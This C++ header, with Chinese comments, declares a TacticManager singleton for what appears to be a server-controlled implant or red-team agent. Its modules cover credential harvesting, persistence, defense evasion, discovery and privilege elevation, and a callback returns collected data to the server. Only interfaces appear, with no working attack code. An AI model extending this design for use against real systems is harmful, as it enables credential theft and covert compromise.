#pragma once
#include <functional>
#include <memory>
#include <vector>
#include <unordered_map>
#include "Common/ThirdParty/json.hpp"
#include "ITacticModule.hpp"

namespace cleat {

    /**
     * @brief 战术模块管理器（单例；原 AntiManager， 改名消歧）
     *
     * 【我不是谁】与 Core/Module/ModuleManager 分工不同：
     *   - ModuleManager : 运行时反射加载的 DLL 模块（IModule / ModExec 入口）
     *   - TacticManager : 编译期静态注册的战术能力对象（ITacticModule），配置驱动
     *
     * 注：名字里的 Anti 来自「反分析」历史，但它统管全战术域
     *     （credential / persistence / defenseevasion / discovery / elevation）。
     */
    class TacticManager {
    public:
        static TacticManager& Instance();

        // 注册模块
        void RegisterModule(std::unique_ptr<ITacticModule> module);

        // 应用配置（服务端下发 JSON）; 返回失败的模块名列表(空=全部成功)
        std::vector<std::string> ApplyConfig(const nlohmann::json& config);

        // 获取已注册模块列表
        std::vector<std::string> GetModuleNames() const;

        // 设置全局数据发送回调（由 Agent 注入, 供模块推送数据回传 Server）
        void SetDataSender(std::function<void(const std::vector<uint8_t>&)> sender);

        // 模块推送 JSON 数据（序列化后经数据通道发送）
        void SendData(const nlohmann::json& payload) const;

        // 获取指定模块（用于动作型命令触发, 如凭据采集）
        template<typename T>
        T* GetModule(const std::string& name) {
            auto it = modules_.find(name);
            if (it == modules_.end()) return nullptr;
            return dynamic_cast<T*>(it->second.get());
        }

    private:
        TacticManager() = default;
        ~TacticManager() = default;

        std::unordered_map<std::string, std::unique_ptr<ITacticModule>> modules_;
        std::function<void(const std::vector<uint8_t>&)> dataSender_;
    };

} // namespace cleat